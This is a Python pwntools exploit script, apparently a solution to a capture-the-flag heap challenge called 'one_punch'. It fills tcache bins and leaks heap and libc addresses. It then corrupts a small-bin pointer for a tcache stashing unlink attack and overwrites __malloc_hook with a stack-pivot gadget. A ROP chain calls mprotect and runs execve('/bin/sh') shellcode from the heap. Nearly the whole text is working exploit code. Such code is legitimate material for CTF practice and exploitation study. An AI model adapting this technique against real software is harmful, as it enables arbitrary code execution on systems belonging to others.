#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./one_punch')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(c):
    p.recvuntil('> ')
    p.sendline(str(c))

def new(idx, name):
    cmd(1)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('hero name: ')
    p.send(name)
    sleep(0.1)

def edit(idx, name):
    cmd(2)
    p.recvuntil('idx: ')
    p.sendline(str(idx))
    p.recvuntil('hero name: ')
    p.send(name)
    sleep(0.1)

def show(idx):
    cmd(3)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def free(idx):
    cmd(4)
    p.recvuntil('idx: ')
    p.sendline(str(idx))

def leave():
    cmd(5)

def punch(data):
    cmd(0xC388)
    p.send(data)
    sleep(0.1)

for i in range(5):
    new(0, str(i) * 0xf8)
    free(0) # fillup tcache 0x100
new(0, '0' * 0x408)
new(1, '1' * 0x408)
free(0)
free(1)
show(1) # leak heap
p.recvuntil('hero name: ')
heap_base = u64(p.recvuntil('\n', drop=True).ljust(8, b'\x00')) - 0x7a0
info('heap_base = ' + hex(heap_base))
#gdb.attach(p)

for i in range(5):
    new(0, str(i) * 0x408)
    free(0) # fillup tcache 0x410
new(0, '0' * 0x408)
sh = asm('''
    xor rax, rax
    mov al, 59
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, 0x68732f2f6e69622f
    push rdi
    mov rdi, rsp
    syscall
''')
info('sh => ' + repr(sh))
new(1, sh.ljust(0x408, b'\x90'))
shellcode_addr = heap_base + 0x2820
info('shellcode_addr = ' + hex(shellcode_addr))
free(0)
show(0) # leak libc
p.recvuntil('hero name: ')
libc_base = u64(p.recvuntil('\n', drop=True).ljust(8, b'\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))
#gdb.attach(p)

for i in range(3):
    new(1, '1' * 0x408)
    new(2, '2' * 0x408) # prevent from consolidate
    free(1) # put into unsorted bin
    new(2, '2' * 0x308) # stash remainder(0x100) into small bins
new(0, '0' * 0x217) # set up tcache 0x217 before unlink
free(0) # put into tcache 0x220
payload = b'\x00' * 0x308 + p64(0x101) + p64(heap_base + 0x3340) + p64(heap_base + 0x40)
#payload = p64(0xdeadbeef)
edit(1, payload) # overwrite smallbins' bk
new(1, '1' * 0xf8) # unlink
#gdb.attach(p)

mprotect = libc_base + libc.symbols['mprotect']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
add_rsp_0x48_ret = libc_base + next(libc.search(asm('add rsp, 0x48 ; ret')))
pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi ; ret')))
pop_rsi_ret = libc_base + next(libc.search(asm('pop rsi ; ret')))
pop_rdx_r12_ret = libc_base + next(libc.search(asm('pop rdx ; pop r12 ; ret')))
ret = libc_base + next(libc.search(asm('ret')))
info('malloc_hook_addr = ' + hex(malloc_hook))
edit(0, p64(malloc_hook).ljust(0x217, b'\x00')) # change tcache 0x220's fd => __malloc_hook
punch('punch') # get a chunk from tcache 0x220
punch(p64(add_rsp_0x48_ret)) # get __malloc_hook from tcache 0x220
info('add_rsp_0x48_ret = ' + hex(add_rsp_0x48_ret))
#gdb.attach(p)
payload = p64(pop_rdi_ret) + p64(heap_base + 0x2000) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0) + p64(mprotect) + p64(shellcode_addr)
new(2, payload.ljust(0x408, b'\x00'))
p.interactive()

